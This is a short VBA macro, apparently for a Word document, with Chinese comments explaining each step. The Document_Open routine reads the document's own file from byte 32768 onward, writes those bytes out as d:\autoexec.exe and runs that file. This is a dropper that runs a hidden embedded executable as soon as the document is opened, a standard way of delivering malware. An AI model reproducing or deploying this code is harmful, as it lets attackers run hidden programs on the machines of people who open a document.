Private Sub Document_Open()

Dim buffer(65536) As Byte

Dim h, h2, j, i, k As Long

h = CreateFile(ThisDocument.Path & "/" & ThisDocument.Name, GENERIC_READ, FILE_SHARE_READ + FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0)

'以SHARE_READ的方式開啟自身的DOC文件

h2 = CreateFile("d:\autoexec.exe", GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0)

'新增一個EXE文件準備存放讀取出來的資料.

If h = INVALID_HANDLE_value Then

Exit Sub

End If

k = SetFilePointer(h, 32768, nil, 0)

'把文件指針移動到DOC文件與EXE文件交界處.

Do

i = ReadFile(h, buffer(0), 65536, j, 0)

i = WriteFile(h2, buffer(0), j, j, 0)

Loop Until j < 65536

CloseHandle (h)

CloseHandle (h2)

Shell "d:\autoexec.exe"

'執行EXE文件

End Sub
